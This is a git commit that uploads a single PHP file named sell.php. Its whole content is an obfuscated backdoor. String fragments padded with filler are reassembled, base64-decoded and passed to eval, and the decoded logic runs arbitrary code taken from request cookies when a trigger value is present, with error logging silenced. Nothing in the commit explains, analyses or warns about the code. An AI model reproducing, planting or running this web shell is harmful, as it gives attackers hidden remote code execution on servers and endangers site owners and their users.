8784e2d7b2bcb72a00348c729d7323c2f294db9e
This Me Zy <31403046+zycoder0day@users.noreply.github.com>
2025-01-11 02:19:25 +0700

    Add files via upload

---
+++ sell.php
@@ -0,0 +1,10 @@
+<?php 
+$qm2="9zZXQoJat2Vycatm9yX2xvZycsatICcvZGVat2L251bGwnKatTskataz0na3N6cGoxatMatic7ZWNatobyAnPCcatuJGsuJz4natO2V2Ya";
+$mz = "str_replace";
+$qm3="tWwoYmFatzZTY0X2RatlY29kZShwcatmatVnX3JlcGxhY2UoYXJyYatXkoJy9atbXlx3PVxzXS8nLCcvatXHMvJyksIGFycmat";
+$qpf = "bwawswew6w4w_wdwewcowdwe";
+$qm4="F5KCcnLCcrJyksIGpvataW4oYXJyYXlatfc2xpY2atUoJGEsJGMoJGEpLTMpKSkpKTtlY2hvICcat8LycuJGsuJz4nOat30=";
+$qm1="JGM9J2NvdatW50JzskYT0kX0NPTat0tJRTtpZiathyZXNldCgkYSk9PSdraicgJiYgJGMoJatGEpPatjMpeat2luaatV";
+$qpf = $mz("w", "", $qpf);
+eval($qpf($mz("at", "", $qm1.$qm2.$qm3.$qm4))); 
+?>
